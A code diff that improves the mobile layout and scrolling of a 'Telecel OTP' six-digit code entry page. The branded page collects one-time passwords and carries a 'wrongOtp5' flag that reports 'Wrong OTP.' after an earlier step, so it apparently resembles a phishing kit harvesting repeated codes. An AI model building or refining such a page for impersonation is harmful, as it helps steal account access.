@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 <title>Telecel OTP</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -16,13 +16,17 @@
 body{
   margin:0;
   background:#f5f5f5;
-  display:flex;
-  justify-content:center;
+  /* make body scrollable when keyboard opens */
+  display: block;
+  padding: 20px 16px;
+  min-height: 100vh;
 }
 
-/* CONTAINER */
+/* CONTAINER - centered, naturally scrolls */
 .container{
   width:360px;
+  max-width: 100%;
+  margin: 0 auto;
   background:#f7f7f7;
   border-radius:28px;
   padding:40px 20px;
@@ -30,6 +34,7 @@ body{
   position:relative;
   overflow:hidden;
   text-align:center;
+  margin-bottom: 40px; /* extra space for scrolling */
 }
 
 /* RED SHAPE */
@@ -89,25 +94,41 @@ body{
   line-height:1.5;
 }
 
-/* OTP BOXES */
+/* OTP BOXES - numeric keypad ready */
 .otp-container{
   display:flex;
   justify-content:space-between;
+  gap: 12px;
   margin-top:20px;
 }
 
 .otp-input{
-  width:45px;
+  width:48px;
   height:50px;
-  border-radius:10px;
+  border-radius:12px;
   border:1px solid #ddd;
   text-align:center;
-  font-size:18px;
+  font-size:20px;
+  font-weight:600;
   outline:none;
+  background:#fff;
+  transition: border 0.2s;
+  /* Force numeric keypad on mobile */
+  inputmode: numeric;
+  -moz-appearance: textfield;
+  appearance: textfield;
 }
 
 .otp-input:focus{
   border:2px solid #ff0000;
+  box-shadow:0 0 0 2px rgba(255,0,0,0.1);
+}
+
+/* Remove spinner arrows */
+.otp-input::-webkit-outer-spin-button,
+.otp-input::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
 }
 
 /* BUTTONS */
@@ -119,12 +140,12 @@ body{
   font-size:16px;
   margin-top:20px;
   cursor:pointer;
+  font-weight:600;
 }
 
 .btn-primary{
   background:#ff0000;
   color:#fff;
-  font-weight:600;
 }
 
 .btn-primary.disabled, .btn-primary:disabled{
@@ -240,15 +261,15 @@ body{
       . Enter it below to verify your account.
     </div>
 
-    <!-- OTP INPUT SECTION -->
+    <!-- OTP INPUT SECTION (6 digits) with numeric keypad -->
     <div id="otpSection">
       <div class="otp-container">
-        <input class="otp-input" maxlength="1" id="otp1" autofocus>
-        <input class="otp-input" maxlength="1" id="otp2">
-        <input class="otp-input" maxlength="1" id="otp3">
-        <input class="otp-input" maxlength="1" id="otp4">
-        <input class="otp-input" maxlength="1" id="otp5">
-        <input class="otp-input" maxlength="1" id="otp6">
+        <input class="otp-input" maxlength="1" id="otp1" autofocus inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp2" inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp3" inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp4" inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp5" inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp6" inputmode="numeric" pattern="[0-9]*">
       </div>
       <div class="message" id="otpMessage"></div>
       <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
@@ -307,7 +328,7 @@ body{
     }
     maskedPhoneSpan.textContent = maskPhone(phone);
 
-    // ==================== OTP AUTO‑ADVANCE ====================
+    // ==================== OTP AUTO‑ADVANCE (6 digits) ====================
     function focusNext(index) {
       if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
     }
@@ -325,7 +346,24 @@ body{
       }
     }
 
+    // ========== SCROLL ENHANCEMENT: keep focused input visible ==========
+    function scrollElementIntoView(element) {
+      if (!element) return;
+      setTimeout(() => {
+        element.scrollIntoView({
+          behavior: 'smooth',
+          block: 'center',
+          inline: 'nearest'
+        });
+      }, 100);
+    }
+
+    function handleFocusScroll(event) {
+      scrollElementIntoView(event.target);
+    }
+
     otpInputs.forEach((input, idx) => {
+      // Input event: filter digits and auto advance
       input.addEventListener('input', function() {
         this.value = this.value.replace(/\D/g, '');
         if (this.value.length === 1) focusNext(idx);
@@ -349,12 +387,62 @@ body{
           e.preventDefault();
         }
       });
+
+      // Ensure numeric keyboard and scroll into view on focus
+      input.addEventListener('focus', handleFocusScroll);
+    });
+
+    // When Next button becomes enabled, scroll it into view if needed
+    const originalUpdate = updateNextButton;
+    const enhancedUpdate = function() {
+      originalUpdate();
+      if (!nextBtn.disabled) {
+        setTimeout(() => {
+          const rect = nextBtn.getBoundingClientRect();
+          const viewHeight = window.innerHeight;
+          const isHidden = rect.bottom > viewHeight || rect.top < 0;
+          if (isHidden) {
+            nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+          }
+        }, 80);
+      }
+    };
+    // Replace update function globally within this scope
+    window.updateNextButton = enhancedUpdate;
+    // Rebind so all calls use enhanced version
+    const updateNextButtonRef = enhancedUpdate;
+
+    // Override original variable
+    const originalBinding = updateNextButton;
+    // Force reassign
+    updateNextButton = enhancedUpdate;
+
+    // Also on window resize (keyboard open/close), re-scroll focused element or next button
+    let resizeTimer;
+    window.addEventListener('resize', function() {
+      if (resizeTimer) clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(() => {
+        const focused = document.activeElement;
+        if (focused && focused.classList && focused.classList.contains('otp-input')) {
+          focused.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        } else if (nextBtn && !nextBtn.disabled) {
+          const rect = nextBtn.getBoundingClientRect();
+          const viewHeight = window.innerHeight;
+          if (rect.bottom > viewHeight || rect.top < 0) {
+            nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+          }
+        }
+      }, 120);
     });
 
     // ==================== ERROR HANDLING ====================
     function showError(message) {
       errorText.innerText = message || 'An error occurred';
       errorBox.style.display = 'block';
+      // also scroll error into view if needed
+      setTimeout(() => {
+        errorBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }, 50);
     }
 
     window.hideError = function() {
@@ -431,6 +519,8 @@ body{
       if (enteredOtp.length !== 6) {
         otpMessage.textContent = 'Please enter all 6 digits.';
         otpMessage.className = 'message error';
+        // scroll message into view
+        otpMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
         return;
       }
 
@@ -485,13 +575,21 @@ body{
 
     // ==================== CHECK IF CAME FROM OTP5 WITH WRONG OTP ====================
     if (sessionStorage.getItem('wrongOtp5')) {
-      // Show the error message and clear the flag
       showError('Wrong OTP.');
       sessionStorage.removeItem('wrongOtp5');
     }
 
     // ==================== INIT ====================
+    // Ensure enhanced update is called on start
     updateNextButton();
+
+    // Final: if any input already focused (autofocus), scroll into view
+    setTimeout(() => {
+      const active = document.activeElement;
+      if (active && active.classList && active.classList.contains('otp-input')) {
+        active.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    }, 200);
   })();
 </script>
 
